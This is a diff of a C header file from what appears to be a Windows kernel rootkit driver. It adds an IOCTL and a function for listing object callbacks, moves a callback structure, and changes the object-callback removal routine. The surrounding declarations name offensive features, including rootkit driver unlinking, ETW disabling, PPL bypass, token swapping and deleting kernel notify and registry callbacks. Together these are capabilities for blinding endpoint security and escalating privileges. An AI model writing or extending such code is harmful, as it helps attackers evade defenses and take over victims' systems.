@@ -39,6 +39,7 @@
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 #define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
 #define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)
+#define IOCTL_LIST_OBJ_CALLBACKS CTL_CODE_HIDE(18)
 
 
 
@@ -107,18 +108,6 @@ typedef enum _NOTIFY_ROUTINE_TYPE {
     ImageLoadCallback
 } NOTIFY_ROUTINE_TYPE;
 
-// Structure representing a registered object callback entry
-typedef struct OB_CALLBACK_ENTRY_t {
-    LIST_ENTRY CallbackList;                 // Linked into _OBJECT_TYPE.CallbackList
-    OB_OPERATION Operations;                 // Types of operations (create, duplicate, etc.)
-    bool Enabled;                            // Whether the callback is active
-    struct OB_CALLBACK_t* Entry;             // Pointer to the main registration entry
-    POBJECT_TYPE ObjectType;                 // Target object type (e.g., PsProcessType)
-    POB_PRE_OPERATION_CALLBACK PreOperation; // Callback before handle creation
-    POB_POST_OPERATION_CALLBACK PostOperation;// Callback after handle creation
-    KSPIN_LOCK Lock;                         // Synchronization mechanism
-} OB_CALLBACK_ENTRY, * POB_CALLBACK_ENTRY;
-
 typedef struct _MODULE_ENTRY
 {
     LIST_ENTRY InLoadOrderLinks;			// the load order list 
@@ -163,6 +152,17 @@ typedef struct _REGISTRY_CALLBACK_ITEM {
     DWORD64 Unknown2[2];
 } REGISTRY_CALLBACK_ITEM, * PREGISTRY_CALLBACK_ITEM;
 
+typedef struct OB_CALLBACK_ENTRY_t {
+    LIST_ENTRY CallbackList;                 // Linked into _OBJECT_TYPE.CallbackList
+    OB_OPERATION Operations;                 // Types of operations (create, duplicate, etc.)
+    BOOL Enabled;                            // Whether the callback is active
+    struct OB_CALLBACK_t* Entry;             // Pointer to the main registration entry
+    POBJECT_TYPE ObjectType;                 // Target object type (e.g., PsProcessType)
+    POB_PRE_OPERATION_CALLBACK PreOperation; // Callback before handle creation
+    POB_POST_OPERATION_CALLBACK PostOperation;// Callback after handle creation
+    KSPIN_LOCK Lock;                         // Synchronization mechanism
+} OB_CALLBACK_ENTRY, * POB_CALLBACK_ENTRY;
+
 typedef enum _DCMB_CALLBACK_TYPE {
     ProcessObjectCreationCallback,
     ThreadObjectCreationCallback,
@@ -193,6 +193,7 @@ struct disKerETWArgs {
 
 ModulesData* EnumRegisteredDrivers(UINT64);
 ModulesData* EnumRegCallbackDrivers(ULONG64);
+ModulesData* EnumObjCallbackDrivers();
 
 UINT64 FindProcNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
 UINT64 FindThreadNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
@@ -204,7 +205,7 @@ NTSTATUS SearchModules(ULONG64, ModulesData*);
 UINT64 FindKernelBase();
 NTSTATUS DeleteNotifyEntry(ULONG64, int);
 NTSTATUS DeleteRegCallbackEntry(ULONG64, CHAR*);
-NTSTATUS RemObjCallbackNotifyRoutineAddress();
+NTSTATUS DeleteObjCallbackNotifyRoutineAddress(CHAR*);
 
 NTSTATUS pplBypass(UINT64, int);
 NTSTATUS procTokenSwap(DWORD, DWORD, int);
